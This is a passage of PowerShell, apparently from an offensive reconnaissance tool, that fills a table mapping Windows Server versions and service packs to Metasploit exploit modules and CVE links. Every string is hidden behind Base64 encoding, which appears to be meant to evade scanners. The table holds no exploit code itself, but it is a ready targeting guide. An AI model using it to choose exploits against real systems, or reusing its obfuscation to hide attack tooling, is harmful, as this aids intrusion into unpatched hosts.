        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADcAMABfAHcAawBzAHMAdgBjAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA5ADEA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAA0AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADUAXwAwADEANwBfAG0AcwBtAHEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADAAMAA1ADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBpAGkAcwAvAG0AcwAwADMAXwAwADAANwBfAG4AdABkAGwAbABfAHcAZQBiAGQAYQB2AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMQAwADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADUAXwAwADMAOQBfAHAAbgBwAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANQAtADEAOQA4ADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADYANgBfAG4AdwBhAHAAaQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADQANgA4ADgA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAIABQAGEAYwBrACAAMQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADcAXwAwADIAOQBfAG0AcwBkAG4AcwBfAHoAbwBuAGUAbgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANwAtADEANwA0ADgA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBkAGMAZQByAHAAYwAvAG0AcwAwADMAXwAwADIANgBfAGQAYwBvAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAAMwA1ADIALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADQAXwAwADEAMQBfAGwAcwBhAHMAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAMwAtADAANQAzADMALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADYAXwAwADQAMABfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANgAtADMANAAzADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAMwAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwB3AGkAbgBzAC8AbQBzADAANABfADAANAA1AF8AdwBpAG4AcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAANAAtADEAMAA4ADAALwA=')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQAgAFAAYQBjAGsAIAAyAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADgAXwAwADYANwBfAG4AZQB0AGEAcABpAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOAAtADQAMgA1ADAA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAwADkAXwAwADUAMABfAHMAbQBiADIAXwBuAGUAZwBvAHQAaQBhAHQAZQBfAGYAdQBuAGMAXwBpAG4AZABlAHgA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADAAOQAtADMAMQAwADMA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
        $TableExploits.Rows.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AZABvAHcAcwAgAFMAZQByAHYAZQByACAAMgAwADAAOAAgAFIAMgA='))),"",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AHAAbABvAGkAdAAvAHcAaQBuAGQAbwB3AHMALwBzAG0AYgAvAG0AcwAxADAAXwAwADYAMQBfAHMAcABvAG8AbABzAHMA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwB3AHcAdwAuAGMAdgBlAGQAZQB0AGEAaQBsAHMALgBjAG8AbQAvAGMAdgBlAC8AMgAwADEAMAAtADIANwAyADkA')))) | Out-Null  
